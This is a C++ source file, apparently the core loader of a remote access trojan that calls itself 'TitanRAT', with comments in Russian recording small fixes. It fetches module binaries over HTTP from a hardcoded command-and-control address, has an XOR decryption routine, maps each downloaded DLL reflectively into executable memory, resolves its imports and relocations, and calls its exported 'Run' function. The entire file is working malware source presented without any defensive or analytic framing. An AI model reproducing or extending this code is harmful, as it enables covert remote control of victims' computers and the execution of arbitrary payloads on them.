// Core/loader.cpp — FIXED
#include "loader.h"
#include <winhttp.h>
#include <stdio.h>
#include <string>
#include <vector>
#pragma comment(lib, "winhttp.lib")

void xor_decrypt(std::vector<uint8_t>& data, uint8_t key) {
    for (auto& b : data) b ^= key;
}

static bool parse_url(const char* url, std::wstring& host, int& port, std::wstring& path) {
    if (strncmp(url, "http://", 7) != 0) return false;
    const char* start = url + 7;
    const char* host_end = start;
    while (*host_end && *host_end != ':' && *host_end != '/') ++host_end;
    std::string host_str(start, host_end - start);
    host = std::wstring(host_str.begin(), host_str.end());
    port = 80;
    if (*host_end == ':') {
        port = atoi(host_end + 1);
        while (*host_end && *host_end != '/') ++host_end;
    }
    path = L"/";
    if (*host_end == '/') {
        std::string path_str(host_end);
        path = std::wstring(path_str.begin(), path_str.end());
    }
    return true;
}

bool download_module(const std::string& name, std::vector<uint8_t>& out_data) {
    const char* c2_ip = "127.0.0.1";
    const int c2_http_port = 12346;
    char url[256];
    sprintf_s(url, "http://%s:%d/modules/%s.bin", c2_ip, c2_http_port, name.c_str());

    std::wstring host, path;
    int port;
    if (!parse_url(url, host, port, path)) return false;

    // ✅ Исправлено: пробелы в строках убраны
    HINTERNET hSession = WinHttpOpen(L"TitanRAT/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), static_cast<INTERNET_PORT>(port), 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    // ✅ Исправлено: WinHttpSendRequest (без пробела)
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD statusCode = 0;
    DWORD dwSize = sizeof(statusCode);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
        if (statusCode != 200) {
            WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
            return false; // ✅ Исправлено: return f alse
        }
    }

    out_data.clear();
    std::vector<uint8_t> buffer(8192);
    while (true) {
        DWORD dwDownloaded = 0;
        if (!WinHttpReadData(hRequest, buffer.data(), static_cast<DWORD>(buffer.size()), &dwDownloaded)) break;
        if (dwDownloaded == 0) break;
        out_data.insert(out_data.end(), buffer.begin(), buffer.begin() + dwDownloaded);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return out_data.size() > 1024;
}

typedef BOOL (WINAPI *DLL_MAIN)(HMODULE, DWORD, LPVOID);

bool load_reflective_dll(const std::vector<uint8_t>& dll_data, void*& module_base) {
    if (dll_data.size() < sizeof(IMAGE_DOS_HEADER)) return false;
    auto* dos_hdr = reinterpret_cast<const IMAGE_DOS_HEADER*>(dll_data.data());
    if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) return false;

    auto* nt_hdrs = reinterpret_cast<const IMAGE_NT_HEADERS*>(dll_data.data() + dos_hdr->e_lfanew);
    if (nt_hdrs->Signature != IMAGE_NT_SIGNATURE) return false;

    DWORD image_size = nt_hdrs->OptionalHeader.SizeOfImage;
    module_base = VirtualAlloc(nullptr, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!module_base) return false;

    memcpy(module_base, dll_data.data(), nt_hdrs->OptionalHeader.SizeOfHeaders);

    auto* section_hdr = IMAGE_FIRST_SECTION(nt_hdrs);
    for (WORD i = 0; i < nt_hdrs->FileHeader.NumberOfSections; ++i, ++section_hdr) {
        if (section_hdr->SizeOfRawData > 0) {
            memcpy(
                reinterpret_cast<uint8_t*>(module_base) + section_hdr->VirtualAddress,
                dll_data.data() + section_hdr->PointerToRawData,
                section_hdr->SizeOfRawData
            );
        }
    }

    auto* import_dir = &nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->Size > 0) {
        auto* import_desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
            reinterpret_cast<uint8_t*>(module_base) + import_dir->VirtualAddress);
        
        for (; import_desc->Name; ++import_desc) {
            const char* module_name = reinterpret_cast<const char*>(
                reinterpret_cast<uint8_t*>(module_base) + import_desc->Name);
            
            HMODULE hMod = LoadLibraryA(module_name);
            if (!hMod) { VirtualFree(module_base, 0, MEM_RELEASE); return false; }
            
            // ✅ Исправлено: reinterpret_cast (без пробелов)
            auto* thunk = reinterpret_cast<IMAGE_THUNK_DATA*>(
                reinterpret_cast<uint8_t*>(module_base) + import_desc->OriginalFirstThunk);
            auto* iat = reinterpret_cast<IMAGE_THUNK_DATA*>(
                reinterpret_cast<uint8_t*>(module_base) + import_desc->FirstThunk);
            
            for (; thunk->u1.AddressOfData; ++thunk, ++iat) {
                FARPROC func_addr = nullptr;
                if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    func_addr = GetProcAddress(hMod, reinterpret_cast<LPCSTR>(thunk->u1.Ordinal & 0xFFFF));
                } else {
                    auto* import_by_name = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                        reinterpret_cast<uint8_t*>(module_base) + thunk->u1.AddressOfData);
                    func_addr = GetProcAddress(hMod, import_by_name->Name);
                }
                if (!func_addr) { VirtualFree(module_base, 0, MEM_RELEASE); return false; }
                iat->u1.Function = reinterpret_cast<ULONG_PTR>(func_addr);
            }
        }
    }

    if (!(nt_hdrs->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)) {
        auto* reloc_dir = &nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir->Size > 0) {
            auto* reloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                reinterpret_cast<uint8_t*>(module_base) + reloc_dir->VirtualAddress);
            auto* reloc_end = reinterpret_cast<uint8_t*>(reloc) + reloc_dir->Size;
            uintptr_t delta = reinterpret_cast<uintptr_t>(module_base) - nt_hdrs->OptionalHeader.ImageBase;
            
            while (reinterpret_cast<uint8_t*>(reloc) < reloc_end && reloc->SizeOfBlock > 0) {
                auto* entries = reinterpret_cast<uint16_t*>(reloc + 1);
                size_t count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
                
                for (size_t i = 0; i < count; ++i) {
                    if (entries[i] == 0) continue;
                    uint16_t type = entries[i] >> 12;
                    uint16_t offset = entries[i] & 0xFFF;
                    uint8_t* target = reinterpret_cast<uint8_t*>(module_base) + reloc->VirtualAddress + offset;
                    
                    if (type == IMAGE_REL_BASED_HIGHLOW) {
                        *reinterpret_cast<DWORD*>(target) += static_cast<DWORD>(delta);
                    } else if (type == IMAGE_REL_BASED_DIR64) {
                        *reinterpret_cast<ULONGLONG*>(target) += delta;
                    }
                }
                reloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                    reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock);
            }
        }
    }

    auto entry_point = reinterpret_cast<DLL_MAIN>(
        reinterpret_cast<uint8_t*>(module_base) + nt_hdrs->OptionalHeader.AddressOfEntryPoint);

    if (!entry_point(reinterpret_cast<HMODULE>(module_base), DLL_PROCESS_ATTACH, nullptr)) {
        VirtualFree(module_base, 0, MEM_RELEASE);
        return false;
    }

    return true;
}

bool execute_module(void* module_base, const ModuleAPI& api) {
    auto* dos_hdr = static_cast<IMAGE_DOS_HEADER*>(module_base);
    auto* nt_hdrs = reinterpret_cast<IMAGE_NT_HEADERS*>(
        static_cast<uint8_t*>(module_base) + dos_hdr->e_lfanew);
    auto* export_dir = &nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (export_dir->Size == 0) return false;

    auto* exports = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
        static_cast<uint8_t*>(module_base) + export_dir->VirtualAddress);

    auto* names = reinterpret_cast<DWORD*>(
        static_cast<uint8_t*>(module_base) + exports->AddressOfNames);
    auto* ordinals = reinterpret_cast<WORD*>(
        static_cast<uint8_t*>(module_base) + exports->AddressOfNameOrdinals);
    auto* functions = reinterpret_cast<DWORD*>(
        static_cast<uint8_t*>(module_base) + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        const char* export_name = reinterpret_cast<const char*>(
            static_cast<uint8_t*>(module_base) + names[i]);
        if (strcmp(export_name, "Run") == 0) {
            auto* func_ptr = reinterpret_cast<uint8_t*>(module_base) + functions[ordinals[i]];
            typedef int (*RunFunc)(ModuleAPI*);
            auto run = reinterpret_cast<RunFunc>(func_ptr);
            run(const_cast<ModuleAPI*>(&api));
            return true;
        }
    }
    return false;
}